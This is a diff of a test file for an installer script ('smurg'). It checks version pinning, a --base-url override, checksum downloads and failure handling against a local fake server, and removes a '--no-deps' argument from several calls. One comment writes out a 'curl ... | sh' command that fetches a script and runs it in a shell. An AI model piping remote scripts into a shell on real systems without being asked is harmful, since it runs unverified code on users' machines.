+    expect(NOTICES_TEXT).not.toContain('sandbox-runtime');
 
     // --notices names another file.
     const elsewhere = join(dirs.home, 'notices.txt');
@@ -1054,7 +938,7 @@ describe('scripts/install.sh from a local server with the R2 layout (v<X.Y.Z>/ a
     const latest = await readFile(join(dirs.home, 'bucket', 'latest', 'install.sh'), 'utf8');
 
     // `curl -fsSL <server>/latest/install.sh | SMURG_INSTALL_BASE_URL=<server>/v9.8.6 sh`: the older version.
-    const pinned = await runShell('/bin/sh', ['-s', '--', '--no-deps'], { ...f.env, SMURG_INSTALL_BASE_URL: `${server.base}/v9.8.6` }, latest);
+    const pinned = await runShell('/bin/sh', ['-s'], { ...f.env, SMURG_INSTALL_BASE_URL: `${server.base}/v9.8.6` }, latest);
     expect(pinned.out).toContain('smurg 9.8.6 (fake smurg-linux-x64)');
     expect(pinned.code).toBe(0);
     expect(pinned.out).toContain(`第三方元件的授權條款：${server.base}/v9.8.6/THIRD-PARTY-NOTICES.txt`);
@@ -1062,7 +946,7 @@ describe('scripts/install.sh from a local server with the R2 layout (v<X.Y.Z>/ a
 
     // --base-url wins over the environment.
     server.requests.length = 0;
-    const flag = await runShell('/bin/sh', ['-s', '--', '--no-deps', '--base-url', `${server.base}/v9.8.7/`], { ...f.env, SMURG_INSTALL_BASE_URL: `${server.base}/v9.8.6` }, latest);
+    const flag = await runShell('/bin/sh', ['-s', '--', '--base-url', `${server.base}/v9.8.7/`], { ...f.env, SMURG_INSTALL_BASE_URL: `${server.base}/v9.8.6` }, latest);
     expect(flag.out).toContain('smurg 9.8.7 (fake smurg-linux-x64)');
     expect(flag.code).toBe(0);
     expect(server.requests.sort()).toEqual(['/v9.8.7/SHA256SUMS', '/v9.8.7/smurg-linux-x64']);
@@ -1071,7 +955,7 @@ describe('scripts/install.sh from a local server with the R2 layout (v<X.Y.Z>/ a
     // latest/ holds only install.sh and VERSION: as a download location it fails cleanly and installs nothing.
     const g = await faked(LINUX_X64);
     server.requests.length = 0;
-    const wrong = await runShell('/bin/sh', ['-s', '--', '--no-deps'], { ...g.env, SMURG_INSTALL_BASE_URL: `${server.base}/latest` }, latest);
+    const wrong = await runShell('/bin/sh', ['-s'], { ...g.env, SMURG_INSTALL_BASE_URL: `${server.base}/latest` }, latest);
     expect(wrong.code).not.toBe(0);
     expect(wrong.out).toContain(`無法下載 ${server.base}/latest/SHA256SUMS`);
     expect(server.requests).toEqual(['/latest/SHA256SUMS']);
